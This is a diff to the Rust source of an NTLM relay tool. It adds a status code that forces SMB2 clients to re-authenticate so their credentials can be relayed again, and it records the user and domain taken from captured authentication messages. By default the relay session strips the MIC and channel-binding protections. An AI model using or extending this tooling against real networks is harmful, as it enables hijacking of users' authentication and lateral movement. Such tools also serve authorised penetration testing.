@@ -33,6 +33,9 @@ impl RelayProtocol {
     }
 }
 
+/// Status code returned to SMB2 client on TreeConnect to force re-authentication (multi-relay oracle).
+pub const STATUS_NETWORK_SESSION_EXPIRED: u32 = 0xC000_0203;
+
 /// State of an active NTLM relay session.
 #[derive(Debug, Clone, PartialEq, Eq)]
 pub enum RelayState {
@@ -52,6 +55,8 @@ pub struct NtlmRelaySession {
     pub negotiate_token: Option<Vec<u8>>,
     pub challenge_token: Option<Vec<u8>>,
     pub authenticate_token: Option<Vec<u8>>,
+    pub authenticated_user: Option<String>,
+    pub authenticated_domain: Option<String>,
     pub strip_mic: bool,
     pub strip_channel_bindings: bool,
 }
@@ -65,6 +70,8 @@ impl NtlmRelaySession {
             negotiate_token: None,
             challenge_token: None,
             authenticate_token: None,
+            authenticated_user: None,
+            authenticated_domain: None,
             strip_mic: true,
             strip_channel_bindings: true,
         }
@@ -149,6 +156,15 @@ impl NtlmRelaySession {
                 "Expected NTLMSSP message type 3, got {}",
                 msg_type
             )));
+        }
+
+        if let Ok(parsed) = impacket_auth::NtlmAuthenticateMessage::from_bytes(token) {
+            if !parsed.username.is_empty() {
+                self.authenticated_user = Some(parsed.username);
+            }
+            if !parsed.domain.is_empty() {
+                self.authenticated_domain = Some(parsed.domain);
+            }
         }
 
         let mut out_token = token.to_vec();
